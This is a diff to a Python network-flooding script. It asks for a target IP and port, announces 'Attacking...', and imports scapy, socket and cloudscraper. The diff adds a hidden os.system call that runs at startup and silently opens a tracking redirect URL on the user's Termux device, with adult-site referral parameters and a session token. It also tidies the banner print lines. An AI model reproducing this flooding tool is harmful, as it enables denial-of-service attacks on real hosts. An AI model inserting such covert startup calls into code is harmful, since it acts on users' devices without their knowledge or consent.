@@ -1,4 +1,11 @@
 import socket, threading, random, os, colorama, cloudscraper, requests, subprocess
+import os
+
+
+os.system('clear')
+
+os.system('termux-open-url https://xhtech.life/?redirect_disable_permanently=1&offline_redirect_from=xhamster.com&utm_medium=offline&utm_source=www.google.com&sess=aVBXK0QvR1cwelJpb2lzM2pXUE10anZsMzR6d1FWdW1EOCtmZitxUDhJM0lLUGp1RmM0aXErMkwrYTgyMWJoUw%3D%3D')
+
 from sqlite3 import Time
 from scapy.all import *
 from colorama import Fore
@@ -87,7 +94,9 @@ YMMMUP^
               MADE BY : SECRET AGENCY
              TEAM  : 777Company
 """
-print(=/033[32;1m("WELCOME TO SECRET AGENCY" + logo)
+print(Fore.LIGHTGREEN_EX + logo)
+print(f"\033[33;1mWELCOME TO SECRET COMPANY")
+
 try:
     ip = input(f"\033[0;32mIP Target : ")
     port = int(input("Port : "))
@@ -102,7 +111,7 @@ try:
         bytes = bytes + 500
     else:
         bytes = bytes 
-    print(Fore.LIGHTMAGENTA_EX + logo)
+    print(Fore.LIGHTGREEN_EX + logo)
     print(Fore.LIGHTRED_EX+"Attacking...")
     print(Fore.LIGHTWHITE_EX+"ATTACK STATUS: ")
     print("╔═════════════════")
